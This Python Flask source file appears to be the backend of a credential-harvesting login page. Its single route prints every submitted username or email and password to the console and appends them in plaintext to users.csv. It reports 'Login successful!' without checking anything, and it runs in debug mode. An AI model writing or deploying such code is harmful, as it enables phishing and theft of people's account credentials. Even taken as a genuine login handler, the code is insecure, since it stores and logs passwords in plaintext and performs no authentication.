
from flask import Flask, render_template, request
import csv
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_DIR = os.path.join(BASE_DIR, "templates")
CSV_FILE = os.path.join(BASE_DIR, "users.csv")

app = Flask(__name__, template_folder=TEMPLATE_DIR)


@app.route("/", methods=["GET", "POST"])
def login():

    if request.method == "POST":

        username = request.form.get("username") or request.form.get("email") or ""
        password = request.form.get("password", "")

        print("----- LOGIN DETAILS -----")
        print("Username:", username)
        print("Password:", password)

        file_exists = os.path.exists(CSV_FILE)

        with open(CSV_FILE, "a", newline="", encoding="utf-8") as file:
            writer = csv.writer(file)

            if not file_exists:
                writer.writerow([
                    "Username",
                    "Password"
                ])

            writer.writerow([
                username,
                password
            ])

        print("Login details saved to users.csv")

        return "Login successful!"

    return render_template("login.html")


if __name__ == "__main__":
    app.run(debug=True)
